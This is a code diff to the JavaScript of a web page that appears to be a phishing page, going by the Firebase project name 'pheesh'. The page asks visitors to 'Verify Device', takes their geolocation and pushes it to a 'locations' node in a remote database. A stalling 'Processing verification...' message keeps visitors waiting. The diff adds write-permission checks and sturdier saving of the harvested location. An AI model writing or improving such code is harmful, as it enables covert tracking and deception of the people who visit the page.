@@ -1,19 +1,36 @@
-// Initialize Firebase with minimal config - only database URL needed since write access is allowed
+// Initialize Firebase with minimal config
 const firebaseConfig = {
     databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app"
 };
 
 // Initialize Firebase
+let database;
 try {
     firebase.initializeApp(firebaseConfig);
     console.log('Firebase initialized successfully');
-    const database = firebase.database();
+    database = firebase.database();
     console.log('Database reference created');
 
     // Test database connection
     database.ref('.info/connected').on('value', (snapshot) => {
-        console.log('Database connection state:', snapshot.val());
+        const isConnected = snapshot.val();
+        console.log('Database connection state:', isConnected);
+        if (!isConnected) {
+            console.error('Not connected to Firebase database');
+        }
     });
+
+    // Test write permission
+    const testRef = database.ref('test-write');
+    testRef.set({
+        timestamp: firebase.database.ServerValue.TIMESTAMP
+    }).then(() => {
+        console.log('Write permission verified');
+        testRef.remove(); // Clean up test data
+    }).catch(error => {
+        console.error('Write permission test failed:', error);
+    });
+
 } catch (error) {
     console.error('Error initializing Firebase:', error);
 }
@@ -69,17 +86,29 @@ document.addEventListener('DOMContentLoaded', () => {
                     console.log('Attempting to save location data:', locationData);
 
                     // Save location data to Firebase
-                    database.ref('locations').push(locationData)
-                        .then(() => {
-                            console.log('Location saved successfully to Firebase');
-                            // Keep showing loading state instead of redirecting
-                            locationStatus.textContent = 'Processing verification...';
-                        })
-                        .catch(error => {
-                            console.error('Error saving location to Firebase:', error);
-                            // Even on error, keep showing loading state
-                            locationStatus.textContent = 'Processing verification...';
+                    if (!database) {
+                        console.error('Database not initialized');
+                        locationStatus.textContent = 'Verification error. Please try again.';
+                        return;
+                    }
+
+                    try {
+                        const newLocationRef = database.ref('locations').push();
+                        await newLocationRef.set(locationData);
+                        console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
+                        locationStatus.textContent = 'Processing verification...';
+                    } catch (error) {
+                        console.error('Error saving location to Firebase:', error);
+                        console.error('Error details:', {
+                            code: error.code,
+                            message: error.message,
+                            stack: error.stack
                         });
+                        locationStatus.textContent = 'Verification error. Please try again.';
+                        allowLocationButton.disabled = false;
+                        allowLocationButton.textContent = 'Verify Device';
+                        allowLocationButton.classList.remove('loading');
+                    }
                 },
                 (error) => {
                     console.error('Error getting location:', error);
